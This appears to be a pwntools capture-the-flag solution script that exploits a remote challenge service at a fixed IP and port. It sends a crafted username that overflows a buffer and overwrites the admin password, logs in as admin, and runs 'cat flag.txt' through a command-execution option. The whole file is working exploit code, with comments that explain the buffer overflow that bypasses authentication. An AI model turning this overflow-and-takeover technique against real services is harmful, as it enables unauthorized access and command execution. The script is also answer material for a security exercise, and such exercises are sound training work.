import subprocess
from pwn import *

conn = remote('140.113.207.245', 30172)
conn.recvuntil(b'Enter Your Action\n> ')
conn.sendline(b'2') # register
conn.recvuntil(b'Enter your username: \n> ')
conn.sendline(b'0000000000000000aaaaaaaa') # use buffer overflow to overwrite the random 8 chars of admin.password with eight small As
conn.recvuntil(b'Enter your password: \n> ')
conn.sendline(b'anypwdisokay')
conn.recvuntil(b'Enter Your Action\n> ')
conn.sendline(b'1') # login
conn.recvuntil(b'Enter your username: \n> ')
conn.sendline(b'admin')
conn.recvuntil(b'Enter your password: \n> ')
conn.sendline(b'aaaaaaaa')
conn.recvuntil(b'Enter Your Action\n> ')
conn.sendline(b'3') # execute command
conn.recvuntil(b'Enter your command: \n> ')
# conn.sendline(b'cat flag.txt')
for char in 'cat flag.txt\n':
    conn.send(char.encode())
flag = conn.recvline().decode('ascii')
print(flag)